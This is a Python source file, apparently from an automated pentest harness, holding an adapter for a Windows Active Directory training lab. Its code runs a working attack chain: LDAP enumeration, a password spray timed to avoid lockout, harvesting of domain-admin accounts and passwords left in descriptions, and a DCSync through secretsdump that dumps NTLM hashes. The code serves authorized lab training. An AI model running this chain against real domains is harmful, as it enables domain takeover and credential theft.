"""Bounded adapter for the authorized GOAD MINILAB Windows domain lab.

Runs fixed, deterministic Active Directory attack steps against the deployed
mini.lab domain through impacket (LDAP for enumeration and credential
validation, secretsdump for DCSync). This is a white-box training lab: the
scope and candidate accounts come from the operator's own lab manifest, exactly
like ComplexWebAdapter imports its ground-truth flag from lab sources.

Safety and evidence policy:
  * every step is invoked through a policy-gated tool action (see tools.py);
  * credentials are read from environment variables only;
  * raw NTLM hashes are never committed -- only a SHA-256 fingerprint and a
    masked prefix are stored, and the full dump stays in memory.

Chain (authorized lab):
  anonymous enumeration (attempt, recorded honestly when the DC restricts it) ->
  bounded password spray (weak domain-admin credential) ->
  authenticated LDAP (password-in-description + DA membership) ->
  DCSync (domain-admin credential material).
"""
from __future__ import annotations

import hashlib
import os
import re
import shutil
import subprocess
import sys
from dataclasses import dataclass
from typing import Any, Callable

from .models import Target
from .policy import PolicyEngine

try:  # impacket is an optional runtime dependency, imported only for goad.
    from impacket.ldap import ldap as _ldap
    from impacket.ldap import ldapasn1 as _ldapasn1

    _IMPACKET = True
except Exception:  # pragma: no cover - environment dependent
    _ldap = None
    _ldapasn1 = None
    _IMPACKET = False

_NT_HASH_RE = re.compile(
    r"^(\S+):(\d+):aad3b435b51404eeaad3b435b51404ee:([0-9a-f]{32}):::$", re.I
)


def _dn_to_base(dn: str) -> str:
    """Accept either 'DC=mini,DC=lab' or 'mini.lab' as the search base."""
    if dn.upper().startswith("DC="):
        return dn
    return ",".join(f"DC={part}" for part in dn.split(".") if part)


def _csv(value: str) -> list[str]:
    return [item.strip() for item in value.split(",") if item.strip()]


def _sha256(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _mask(nt_hash: str) -> str:
    if len(nt_hash) < 8:
        return "********"
    return f"{nt_hash[:4]}...{nt_hash[-4:]}"


@dataclass(frozen=True)
class DomainAccount:
    name: str
    description: str = ""
    groups: tuple[str, ...] = ()
    admin_count: bool = False

    @property
    def is_domain_admin(self) -> bool:
        return self.admin_count or any(g.lower() == "domain admins" for g in self.groups)


class GoadAdapter:
    """impacket-backed adapter for the authorized GOAD MINILAB lab."""

    source_name = "goad"
    # Kept for agent compatibility: goad recon is not HTTP-path based.
    recon_paths = ("anonymous-enum", "authenticated-enum")

    def __init__(self, policy: PolicyEngine | None = None) -> None:
        self.policy = policy or PolicyEngine()
        self.domain = os.environ.get("GOAD_DOMAIN", "mini.lab").lower()
        self.dc_ip = os.environ.get("GOAD_DC_IP", "192.168.56.30")
        self.ws_ip = os.environ.get("GOAD_WS_IP", "192.168.56.31")
        self.base_dn = _dn_to_base(os.environ.get("GOAD_BASE_DN", "DC=mini,DC=lab"))
        # Bounded candidate lists (operator scope) drawn from the lab's own weak
        # accounts/credentials (public GOAD defaults). Ordered so each account
        # validates within the lab's 5-attempt lockout window; see password_spray().
        self.spray_users = _csv(
            os.environ.get("GOAD_SPRAY_USERS", "alice,bob,carol,dave")
        )
        self.spray_passwords = _csv(
            os.environ.get(
                "GOAD_SPRAY_PASSWORDS",
                "spongebob,superman,123456789,rockyou",
            )
        )

    # ------------------------------------------------------------------ helpers
    def _require_impacket(self) -> None:
        if not _IMPACKET:
            raise RuntimeError(
                "impacket is not installed for the goad scenario; run "
                "`pip install impacket 'setuptools<81'` in the harness interpreter."
            )

    def _require(self, action: str) -> Target:
        """Gate an attack step through policy; scope is pinned to the lab DC."""
        return self.policy.require_action(action, Target(self.dc_ip, 389, "goad"))

    def _connect(self, user: str = "", password: str = "", anonymous: bool = False):
        self._require_impacket()
        conn = _ldap.LDAPConnection(f"ldap://{self.dc_ip}", self.base_dn, self.dc_ip)
        if anonymous:
            conn.login("", "", "", authenticationChoice="simple")
        else:
            conn.login(user, password, self.domain)
        return conn

    def _bind_ok(self, user: str, password: str) -> bool:
        conn = _ldap.LDAPConnection(f"ldap://{self.dc_ip}", self.base_dn, self.dc_ip)
        try:
            conn.login(user, password, self.domain)
            return True
        except _ldap.LDAPSessionError:
            return False
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def _query(
        self,
        conn,
        search_filter: str,
        attributes: list[str],
        callback: Callable[[dict[str, Any]], None],
    ) -> None:
        def record(item: Any) -> None:
            if not isinstance(item, _ldapasn1.SearchResultEntry):
                return
            row: dict[str, Any] = {}
            for attribute in item["attributes"]:
                attr_type = str(attribute["type"])
                try:
                    vals = [v.asOctets().decode("utf-8", "replace") for v in attribute["vals"]]
                except Exception:
                    vals = [str(v) for v in attribute["vals"]]
                row[attr_type] = vals
            callback(row)

        sc = _ldap.SimplePagedResultsControl(size=100)
        conn.search(
            searchFilter=search_filter,
            attributes=attributes,
            sizeLimit=0,
            searchControls=[sc],
            perRecordCallback=record,
        )

    @staticmethod
    def _secretsdump_path() -> str:
        scripts_dir = os.path.join(os.path.dirname(sys.executable), "Scripts")
        candidate = os.path.join(scripts_dir, "secretsdump.py")
        if os.path.isfile(candidate):
            return candidate
        found = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
        if found:
            return found
        return "secretsdump.py"

    # ------------------------------------------------------------ attack steps
    def enumerate_anonymous(self) -> dict[str, Any]:
        """Attempt anonymous LDAP enumeration; record the honest outcome."""
        self._require_impacket()
        self._require("goad_enum_anon")
        result: dict[str, Any] = {
            "anonymous_bind": False,
            "anonymous_ldap_search": False,
            "users": [],
            "error": None,
        }
        conn = None
        try:
            conn = _ldap.LDAPConnection(f"ldap://{self.dc_ip}", self.base_dn, self.dc_ip)
            conn.login("", "", "", authenticationChoice="simple")
            result["anonymous_bind"] = True
        except Exception as exc:  # noqa: BLE001 - record the DC's refusal verbatim
            result["error"] = str(exc)
            if conn is not None:
                try:
                    conn.close()
                except Exception:
                    pass
            return result
        try:
            rows: list[dict[str, Any]] = []
            self._query(
                conn,
                "(objectClass=user)",
                ["sAMAccountName", "description", "memberOf"],
                rows.append,
            )
            result["anonymous_ldap_search"] = True
            result["users"] = [
                (row.get("sAMAccountName") or [""])[0]
                for row in rows
                if (row.get("sAMAccountName") or [""])[0]
            ]
        except Exception as exc:  # noqa: BLE001
            result["error"] = str(exc)
        finally:
            try:
                conn.close()
            except Exception:
                pass
        return result

    def password_spray(self) -> list[dict[str, Any]]:
        """Bounded password spray against the operator-declared candidate list.

        Stops at the first valid password per account so the drill stays under
        the lab's account-lockout threshold (GOAD MINILAB locks an account out
        after 5 failed attempts within a 5-minute window).
        """
        self._require_impacket()
        self._require("goad_spray")
        hits: list[dict[str, Any]] = []
        for user in self.spray_users:
            for password in self.spray_passwords:
                if self._bind_ok(user, password):
                    hits.append({"username": user, "password": password, "valid": True})
                    break
        return hits

    def enumerate_authenticated(self, user: str, password: str) -> list[DomainAccount]:
        """Enumerate accounts (description, groups, adminCount) with valid creds."""
        self._require("goad_enum_auth")
        conn = self._connect(user, password)
        accounts: list[DomainAccount] = []

        def collect(row: dict[str, Any]) -> None:
            name = (row.get("sAMAccountName") or [""])[0]
            if not name or name.endswith("$"):
                return
            groups = row.get("memberOf") or []
            accounts.append(
                DomainAccount(
                    name=name,
                    description=(row.get("description") or [""])[0],
                    groups=tuple(g.split(",", 1)[0].replace("CN=", "") for g in groups),
                    admin_count=(row.get("adminCount") or ["0"])[0] in ("1", "True"),
                )
            )

        try:
            self._query(
                conn,
                "(objectClass=user)",
                ["sAMAccountName", "description", "memberOf", "adminCount"],
                collect,
            )
        finally:
            try:
                conn.close()
            except Exception:
                pass
        return accounts

    def dcsync(self, user: str, password: str) -> dict[str, Any]:
        """Dump NTDS credentials via DRSUAPI; return desensitized evidence only."""
        self._require_impacket()
        self._require("goad_dcsync")
        target = f"{self.domain}/{user}:{password}@{self.dc_ip}"
        command = [sys.executable, self._secretsdump_path(), "-just-dc", target]
        try:
            completed = subprocess.run(
                command, capture_output=True, text=True, timeout=180, check=False
            )
        except subprocess.TimeoutExpired as exc:
            return {"domain_admin_achieved": False, "error": f"secretsdump timed out: {exc}"}
        except OSError as exc:
            return {"domain_admin_achieved": False, "error": f"secretsdump failed to run: {exc}"}

        output = (completed.stdout or "") + "\n" + (completed.stderr or "")
        hashes: dict[str, str] = {}
        for line in output.splitlines():
            match = _NT_HASH_RE.match(line.strip())
            if match:
                hashes[match.group(1)] = match.group(3)

        administrator = hashes.get("Administrator")
        krbtgt = hashes.get("krbtgt")
        return {
            "domain_admin_achieved": administrator is not None,
            "returncode": completed.returncode,
            "krbtgt_hash_present": krbtgt is not None,
            "account_count": len(hashes),
            "administrator_nt_hash_sha256": _sha256(administrator) if administrator else "",
            "administrator_nt_hash_masked": _mask(administrator) if administrator else "",
            "krbtgt_nt_hash_sha256": _sha256(krbtgt) if krbtgt else "",
            "accounts": sorted(hashes.keys()),
        }


__all__ = ["GoadAdapter", "DomainAccount"]
